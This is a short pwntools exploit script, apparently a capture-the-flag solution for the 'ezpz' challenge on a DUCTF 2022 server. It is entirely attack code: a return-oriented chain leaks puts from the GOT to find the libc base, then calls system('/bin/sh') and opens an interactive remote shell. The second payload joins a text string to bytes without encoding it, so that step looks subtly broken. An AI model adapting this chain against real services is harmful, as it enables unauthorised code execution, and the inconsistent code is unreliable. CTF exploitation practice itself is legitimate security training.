from pwn import *

context.log_level = "debug"
# gdb.attach(p)
pay = "0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000"

libc = ELF("./libc-2.35.so")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./ezpz")
p = remote("2022.ductf.dev", 30005)

pop_rdi = 0x00000000004015D3
ret = 0x000000000040101A
main = 0x4014A0

p.sendline(
    pay.encode()
    + b"A" * 36
    + p64(pop_rdi)
    + p64(elf.got["puts"])
    + p64(elf.plt["puts"])
    + p64(main)
)

p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
print("libc base: " + str(hex(libc.address)))

p.sendline(
    pay
    + b"A" * 36
    + p64(ret)
    + p64(pop_rdi)
    + p64(next(libc.search(b"/bin/sh\x00")))
    + p64(libc.symbols["system"])
)
p.interactive()
